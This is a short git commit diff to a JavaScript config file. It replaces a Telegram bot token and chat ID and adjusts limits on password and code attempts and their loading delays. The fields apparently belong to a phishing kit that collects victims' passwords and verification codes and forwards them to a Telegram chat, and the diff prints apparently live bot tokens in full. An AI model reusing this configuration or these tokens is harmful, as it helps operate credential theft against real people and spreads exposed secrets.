99d87bd706c406bc53c2dcefc10f036e09f80820
megait004 <giapfc123@gmail.com>
2026-04-04 14:34:10 +0700

    Update configuration values for token, chat ID, and attempt limits in config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,10 +1,10 @@
 const config = {
-    token: '8459690522:AAHtaIN1Y4UfUhufhWfdd-G7JFAUNw4Hp64',
-    chat_id: '-5136529412',
+    token: '8330790725:AAELl1qt-8Lq59SL6oKkIm2j-IUmenBpxzw',
+    chat_id: '-5185200647',
     noti_token: '',
     noti_chat_id: '',
-    max_password_attempts: 1,
-    max_code_attempts: 5,
+    max_password_attempts: 2,
+    max_code_attempts: 3,
     password_loading_time: 3,
     code_loading_time: 3
 };
